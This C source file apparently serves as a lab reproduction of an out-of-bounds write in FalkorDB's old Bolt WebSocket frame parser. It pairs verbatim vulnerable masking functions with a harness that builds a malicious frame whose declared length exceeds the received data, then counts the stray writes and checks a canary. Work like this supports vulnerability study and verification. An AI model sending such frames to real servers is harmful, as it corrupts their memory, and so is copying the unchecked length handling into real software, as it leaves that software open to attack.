/*
 * Extracted vulnerable functions from FalkorDB parent commit
 * 40780e992ecc11f598ce3f4f65e04367f9abae2f (before "remove bolt support"
 * 0b11a00b34b25c4d4fdfe55f0a35c8a00593bd7d):
 *   src/bolt/ws.c       ws_read_frame()
 *   src/bolt/buffer.c   buffer_index_advance/diff/length/read*,
 *                       buffer_apply_mask_single(), buffer_apply_mask()
 *   src/bolt/buffer.h   BUFFER_CHUNK_SIZE, buffer_index_t, buffer_t
 * Verbatim apart from: ASSERT (empty in release builds per src/RG.h),
 * rm_malloc/arr_* replaced by malloc, OpenSSL SHA/BIO handshake removed,
 * and guard()/canary instrumentation marked LAB below.
 * No network socket. All inputs are local buffers.
 */
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_CHUNK_SIZE 4096
#define ASSERT(X) ((void)0)          /* upstream release mode: #define ASSERT(X) */

typedef struct buffer_index_t buffer_index_t;
typedef struct buffer_t buffer_t;

struct buffer_index_t {
	buffer_t *buf;
	int32_t chunk;
	uint32_t offset;
};

struct buffer_t {
	char **chunks;
	buffer_index_t read;
	buffer_index_t write;
};

static uint64_t g_total_writes;
static uint64_t g_oob_writes;
static unsigned char *g_received_end;

/* LAB instrumentation: count writes past the end of the received bytes. */
static void guard_write(unsigned char *p) {
	g_total_writes++;
	if (g_received_end && p >= g_received_end) g_oob_writes++;
}

static uint64_t buffer_index_diff(buffer_index_t *a, buffer_index_t *b);
static uint64_t buffer_index_length(buffer_index_t *index);

static void buffer_index_advance(buffer_index_t *index, uint32_t n) {
	ASSERT(index != NULL);
	ASSERT(buffer_index_length(index) >= n);
	index->offset += n;
	if (index->offset > BUFFER_CHUNK_SIZE) {
		index->chunk += index->offset / BUFFER_CHUNK_SIZE;
		index->offset %= BUFFER_CHUNK_SIZE;
	}
}

static void buffer_index_read(buffer_index_t *index, char *ptr, uint32_t size) {
	ASSERT(index != NULL);
	ASSERT(buffer_index_length(index) >= size);
	buffer_index_t start = *index;
	char *from = start.buf->chunks[start.chunk] + start.offset;
	buffer_index_advance(index, size);
	if (ptr != NULL) {
		while (start.chunk < index->chunk) {
			memcpy(ptr, from, BUFFER_CHUNK_SIZE - start.offset);
			ptr += BUFFER_CHUNK_SIZE - start.offset;
			start.chunk++;
			start.offset = 0;
			from = index->buf->chunks[start.chunk];
		}
		memcpy(ptr, from, index->offset - start.offset);
	}
}

static uint64_t buffer_index_diff(buffer_index_t *a, buffer_index_t *b) {
	ASSERT(a != NULL); ASSERT(b != NULL); ASSERT(a->buf == b->buf);
	ASSERT(a->chunk > b->chunk || (a->chunk == b->chunk && a->offset >= b->offset));
	uint64_t pos_a = (uint64_t)a->chunk * BUFFER_CHUNK_SIZE + (uint64_t)a->offset;
	uint64_t pos_b = (uint64_t)b->chunk * BUFFER_CHUNK_SIZE + (uint64_t)b->offset;
	return pos_a - pos_b;
}

__attribute__((unused)) static uint64_t buffer_index_length(buffer_index_t *index) {
	ASSERT(index != NULL);
	return buffer_index_diff(&index->buf->write, index);
}

__attribute__((unused)) static uint8_t buffer_read_uint8(buffer_index_t *buf) {
	uint8_t res;
	buffer_index_read(buf, (char *)&res, 1);
	return res;
}

static uint16_t buffer_read_uint16(buffer_index_t *buf) {
	uint16_t res;
	buffer_index_read(buf, (char *)&res, 2);
	return res;
}

static uint32_t buffer_read_uint32(buffer_index_t *buf) {
	uint32_t res;
	buffer_index_read(buf, (char *)&res, 4);
	return res;
}

static uint64_t buffer_read_uint64(buffer_index_t *buf) {
	uint64_t res;
	buffer_index_read(buf, (char *)&res, 8);
	return res;
}

/* FalkorDB src/bolt/endian.h ntohll on this little-endian host. */
static uint64_t ntohll_local(uint64_t x) { return __builtin_bswap64(x); }
#define ntohs(x) __builtin_bswap16(x)
#define ntohll(x) ntohll_local(x)

/* ---- verbatim vulnerable functions ----------------------------------- */

static void buffer_apply_mask_single
(
	buffer_index_t buf,
	uint32_t masking_key,
	uint32_t payload_len,
	int *offset
) {
	char *payload = buf.buf->chunks[buf.chunk] + buf.offset;
	int local_offset = *offset;
	uint32_t double_mask[4] = {masking_key, masking_key, masking_key, masking_key};
	uint64_t offset_mask;                                    /* LAB: unaligned read via memcpy */
	memcpy(&offset_mask, (char *)double_mask + local_offset, sizeof(offset_mask));
	int i = 0;
	for(; i + 8 <= payload_len; i += 8) {
		guard_write((unsigned char *)(payload + i));   /* LAB */
		*(uint64_t *)(payload + i) ^= offset_mask;
	}
	for(; i < payload_len; i++) {
		guard_write((unsigned char *)(payload + i));   /* LAB */
		payload[i] ^= ((char *)double_mask)[local_offset++];
	}
	*offset = local_offset % 4;
}

static void buffer_apply_mask
(
	buffer_index_t buf,
	uint32_t masking_key,
	uint64_t payload_len
) {
	ASSERT(buffer_index_length(&buf) >= payload_len);  /* no-op in release */

#ifdef FIXED
	/* LAB control: the release-mode check the upstream fix replaces by
	 * removing the whole Bolt/WebSocket subsystem. Not an upstream patch. */
	uint64_t available = buffer_index_length(&buf);
	if (payload_len > available) {
		printf("FIXED: reject payload_len=%llu available=%llu\n",
		       (unsigned long long)payload_len, (unsigned long long)available);
		return;
	}
#endif

	buffer_index_t end = buf;
	buffer_index_advance(&end, payload_len);            /* uint64 -> uint32 */
	int offset = 0;
	while(buf.chunk < end.chunk) {
		buffer_apply_mask_single(buf, masking_key,
		                         BUFFER_CHUNK_SIZE - buf.offset, &offset);
		buf.chunk++;
		buf.offset = 0;
	}
	buffer_apply_mask_single(buf, masking_key,
	                         end.offset - buf.offset, &offset);
}

static uint64_t ws_read_frame(buffer_index_t *buf) {
	ASSERT(buf != NULL);
	uint16_t frame_header = ntohs(buffer_read_uint16(buf));
	bool fin = frame_header >> 15;
	ASSERT(fin && "Fragmented frames are not supported");
	uint8_t rsv123 = (frame_header >> 12) & 0x07;
	ASSERT(rsv123 == 0 && "Reserved bits are not supported");
	uint8_t opcode = (frame_header >> 8) & 0x0F;
	ASSERT(opcode == 0x02 || opcode == 0x08 && "Only binary frames are supported");
	(void)fin; (void)rsv123; (void)opcode;  /* LAB: ASSERT-only in upstream */
	uint64_t payload_len = frame_header & 0x7F;
	if(payload_len == 126) {
		payload_len = ntohs(buffer_read_uint16(buf));
	} else if(payload_len == 127) {
		payload_len = ntohll(buffer_read_uint64(buf));
	}
	bool mask = (frame_header >> 7) & 0x1;
	if(mask) {
		uint32_t masking_key = buffer_read_uint32(buf);
		buffer_apply_mask(*buf, masking_key, payload_len);
	}
	return payload_len;
}

/* ---- LAB scaffolding ------------------------------------------------- */

static void put16(unsigned char *p, uint16_t v) {
	p[0] = (unsigned char)(v >> 8);
	p[1] = (unsigned char)v;
}

static void put64(unsigned char *p, uint64_t v) {
	for (int i = 0; i < 8; i++) p[i] = (unsigned char)(v >> (56 - 8*i));
}

int main(int argc, char **argv) {
	const char *mode = argc > 1 ? argv[1] : "vuln";
	int asan_layout = (strcmp(mode, "asan") == 0);
	int small = (argc > 2 && strcmp(argv[2], "small") == 0);
	int supplied = small ? 8 : 0;   /* LAB: in-bounds payload for the control */

/* 14-byte WebSocket frame header: FIN+binary+mask, len=127,
 * 64-bit extended length, 4-byte masking key; zero payload bytes supplied. */
#define HDR 14
	uint64_t payload_len = small ? 8 : (asan_layout ? 8192 + 128 : 4096 + 48);
	uint32_t key = (strcmp(mode, "alt") == 0) ? 0x41414141u : 0x42424242u;

	buffer_t buf;
	memset(&buf, 0, sizeof(buf));
	buf.chunks = calloc(asan_layout ? 3 : 2, sizeof(char *));
	buf.chunks[0] = calloc(BUFFER_CHUNK_SIZE, 1);
	g_received_end = (unsigned char *)buf.chunks[0] + HDR + supplied;
	if (asan_layout) {
		/* LAB layout: short subsequent chunks let ASan's redzone see the
		 * 4096-byte-per-chunk write; upstream allocates 4096 for every chunk. */
		buf.chunks[1] = malloc(64);
		buf.chunks[2] = malloc(64);
		memset(buf.chunks[1], 0, 64);
		memset(buf.chunks[2], 0, 64);
	} else {
		buf.chunks[1] = calloc(BUFFER_CHUNK_SIZE, 1);
	}

	unsigned char *h = (unsigned char *)buf.chunks[0];
	put16(h, 0x82FF);                    /* byte0 FIN|binary, byte1 MASK|len=127 */
	put64(h + 2, payload_len);
	memcpy(h + 10, &key, 4);             /* little-endian: 42 42 42 42 */

	buf.read.buf = &buf;  buf.read.chunk = 0;  buf.read.offset = 0;
	buf.write.buf = &buf; buf.write.chunk = 0; buf.write.offset = HDR + supplied;
	buffer_index_t idx = buf.read;

	/* LAB canary: an 8-byte zero field 104 bytes into chunk 0, well past
	 * the 14 received bytes but inside the first 4096-byte chunk. */
	unsigned char *canary = (unsigned char *)buf.chunks[0] + 104;
	memset(canary, 0, 8);
	uint64_t before;
	memcpy(&before, canary, 8);

	uint64_t got = ws_read_frame(&idx);
	uint64_t after;
	memcpy(&after, canary, 8);

	printf("frame payload_len=%llu mask=0x%08x writes=%llu oob_writes=%llu\n",
	       (unsigned long long)got, key,
	       (unsigned long long)g_total_writes,
	       (unsigned long long)g_oob_writes);
	printf("canary offset=104 before=0x%016llx after=0x%016llx\n",
	       (unsigned long long)before, (unsigned long long)after);
	if (asan_layout)
		printf("short-chunk layout: chunk1/chunk2 are 64 bytes, upstream uses 4096\n");
	free(buf.chunks[0]);
	free(buf.chunks[1]);
	if (asan_layout) free(buf.chunks[2]);
	free(buf.chunks);
	return 0;
}
